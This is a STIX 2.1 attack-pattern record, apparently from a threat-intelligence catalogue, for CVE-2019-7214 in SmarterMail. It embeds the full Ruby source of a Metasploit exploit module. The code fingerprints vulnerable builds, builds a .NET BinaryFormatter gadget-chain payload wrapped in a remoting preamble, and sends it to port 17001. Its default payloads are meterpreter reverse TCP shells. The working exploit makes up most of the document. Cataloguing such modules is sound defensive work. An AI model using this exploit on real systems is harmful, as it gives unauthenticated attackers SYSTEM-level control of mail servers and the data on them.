{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--1d3aba5b-f088-4c2b-9359-4e7a0bc4fac3",
    "created": "2024-08-14T16:54:44.887432Z",
    "modified": "2024-08-14T16:54:44.887436Z",
    "name": "SmarterTools SmarterMail less than build 6985 - .NET Deserialization Remote Code Execution",
    "description": " This module exploits a vulnerability in the SmarterTools SmarterMail software for version numbers <= 16.x or for build numbers < 6985. The vulnerable versions and builds expose three .NET remoting endpoints on port 17001, namely /Servers, /Mail and /Spool. For example, a typical installation of SmarterMail Build 6970 will have the /Servers endpoint exposed to the public at tcp://0.0.0.0:17001/Servers, where serialized .NET commands can be sent through a TCP socket connection.  The three endpoints perform deserialization of untrusted data",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/smartermail_rce.rb",
            "external_id": "smartermail_rce.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2019-7214"
        },
        {
            "source_name": "reference",
            "url": "https://research.nccgroup.com/2019/04/16/technical-advisory-multiple-vulnerabilities-in-smartermail/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::CmdStager\n  prepend Msf::Exploit::Remote::AutoCheck\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'SmarterTools SmarterMail less than build 6985 - .NET Deserialization Remote Code Execution',\n        'Description' => %q{\n          This module exploits a vulnerability in the SmarterTools SmarterMail\n          software for version numbers <= 16.x or for build numbers < 6985.\n          The vulnerable versions and builds expose three .NET remoting endpoints\n          on port 17001, namely /Servers, /Mail and /Spool. For example, a\n          typical installation of SmarterMail Build 6970 will have the /Servers\n          endpoint exposed to the public at tcp://0.0.0.0:17001/Servers, where\n          serialized .NET commands can be sent through a TCP socket connection.\n\n          The three endpoints perform deserialization of untrusted data\n          (CVE-2019-7214), allowing an attacker to send arbitrary commands\n          to be deserialized and executed. This module exploits this vulnerability\n          to perform .NET deserialization attacks, allowing remote code execution\n          for any unauthenticated user under the context of the SYSTEM account.\n          Successful exploitation results in full administrative control of the\n          target server under the NT AUTHORITY\\SYSTEM account.\n\n          This vulnerability was patched in Build 6985, where the 17001 port is\n          no longer publicly accessible, although it can be accessible locally\n          at 127.0.0.1:17001. Hence, this would still allow for a privilege\n          escalation vector if the server is compromised as a low-privileged user.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Soroush Dalili',     # Original discovery and PoC\n          '1F98D',              # ExploitDB author\n          'Ismail E. Dawoodjee' # Metasploit module author\n        ],\n        'References' => [\n          [ 'CVE', '2019-7214' ],\n          [ 'EDB', '49216' ],\n          [ 'URL', 'https://research.nccgroup.com/2019/04/16/technical-advisory-multiple-vulnerabilities-in-smartermail/' ]\n        ],\n        'Platform' => 'win',\n        'Arch' => [ARCH_CMD, ARCH_X86, ARCH_X64],\n        'Targets' => [\n          [\n            'Windows Command',\n            {\n              'Platform' => 'win',\n              'Arch' => [ARCH_CMD, ARCH_X86, ARCH_X64],\n              'Type' => :win_cmd,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'cmd/windows/powershell/meterpreter/reverse_tcp'\n              }\n            }\n          ],\n          [\n            'x86/x64 Windows CmdStager',\n            {\n              'Platform' => 'win',\n              'Arch' => [ARCH_X86, ARCH_X64],\n              'Type' => :windows_cmdstager,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'windows/meterpreter/reverse_tcp',\n                'CmdStagerFlavor' => 'vbs'\n              },\n              'CmdStagerFlavor' => %w[vbs certutil]\n            }\n          ]\n        ],\n        'Privileged' => false,\n        'DisclosureDate' => '2019-04-17',\n        'DefaultTarget' => 0,\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [ARTIFACTS_ON_DISK, IOC_IN_LOGS]\n        }\n      )\n    )\n    register_options(\n      [\n        Opt::RPORT(9998, true, 'SmarterMail default HTTP port'),\n        OptString.new('TARGETURI', [true, 'Base path', '/']),\n        OptInt.new('TCP_PORT', [true, 'SmarterMail default .NET remoting port', 17001]),\n        OptString.new(\n          'ENDPOINT', [\n            true,\n            'Choose one of three exposed endpoints: Servers, Spool, and Mail. Example - tcp://127.0.0.1:17001/Servers',\n            'Servers'\n          ]\n        )\n      ]\n    )\n  end\n\n  def check\n    print_status('Checking target web server for a response...')\n    res = send_request_cgi!({\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path)\n    })\n\n    if res\n      body = res.body\n    else\n      return CheckCode::Unknown('Target did not respond to check request.')\n    end\n\n    unless res.code == 200 && body.downcase.include?('smartermail')\n      return CheckCode::Unknown('Target is not running SmarterMail.')\n    end\n\n    print_good('Target is running SmarterMail.')\n\n    print_status('Checking SmarterMail product build...')\n    product_build = body.match('stProductBuild.*\\s\\(')\n    build_number = product_build.to_s.scan(/\\d+/)[0] if product_build\n\n    if product_build\n      print_good(\"Target is running SmarterMail Build #{build_number}.\")\n    else\n      print_warning('Product build not found. 16.x versions and below do not have a build number.')\n    end\n\n    if product_build && Rex::Version.new(build_number) < Rex::Version.new('6985')\n      return CheckCode::Appears\n    end\n\n    print_status('Checking SmarterMail product version...')\n    product_version = body.match('stProductVersion.*')\n    version_number = product_version.to_s.split('\"')[1] if product_version\n\n    unless product_version\n      return CheckCode::Detected('SmarterMail product version cannot be determined.')\n    end\n\n    print_good(\"Target is running SmarterMail Version #{version_number}.\")\n\n    if Rex::Version.new(version_number) <= Rex::Version.new('16.3.6989.16341')\n      return CheckCode::Appears\n    end\n\n    return CheckCode::Safe\n  end\n\n  def execute_command(cmd, _opts = {})\n    uri = \"tcp://#{datastore['RHOST']}:#{datastore['TCP_PORT']}/#{datastore['ENDPOINT']}\"\n\n    serialized = ::Msf::Util::DotNetDeserialization.generate(\n      cmd,\n      gadget_chain: :TypeConfuseDelegate,\n      formatter: :BinaryFormatter\n    )\n\n    preamble = '.NET'.unpack('C*')                         # Header\n    preamble += [0x01]                                     # Version Major\n    preamble += [0x00]                                     # Version Minor\n    preamble += [0x00, 0x00]                               # Operation Type\n    preamble += [0x00, 0x00]                               # Content Distribution\n    preamble += [serialized.length].pack('I').unpack('C*') # Serialized Data Length\n    preamble += [0x04, 0x00]                               # URI Header\n    preamble += [0x01]                                     # Data Type\n    preamble += [0x01]                                     # Encoding - UTF8\n    preamble += [uri.length].pack('I').unpack('C*')        # URI Length\n    preamble += uri.unpack('C*')                           # URI\n    preamble += [0x00, 0x00]                               # Terminating Header\n    data = preamble + serialized.unpack('C*')              # Data to Send\n    final_payload = data.pack('C*')\n\n    begin\n      sock = Rex::Socket::Tcp.create(\n        'PeerHost' => datastore['RHOST'],\n        'PeerPort' => datastore['TCP_PORT'],\n        'Proxies' => datastore['Proxies'],\n        'Context' => {\n          'Msf' => framework,\n          'MsfExploit' => self\n        }\n      )\n      sock.write(final_payload)\n    rescue Rex::AddressInUse, ::Errno::ETIMEDOUT, Rex::HostUnreachable, Rex::ConnectionTimeout, Rex::ConnectionRefused, ::Timeout::Error, ::EOFError => e\n      print_error(\"Failed: #{e.class} - #{e.message}\")\n      elog(e)\n    ensure\n      sock.close if sock\n    end\n  end\n\n  def exploit\n    case target['Type']\n    when :win_cmd\n      execute_command(payload.encoded)\n    when :windows_cmdstager\n      execute_cmdstager\n    end\n  end\n\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2019-04-17",
    "x_mitre_platforms": [
        "win'"
    ]
}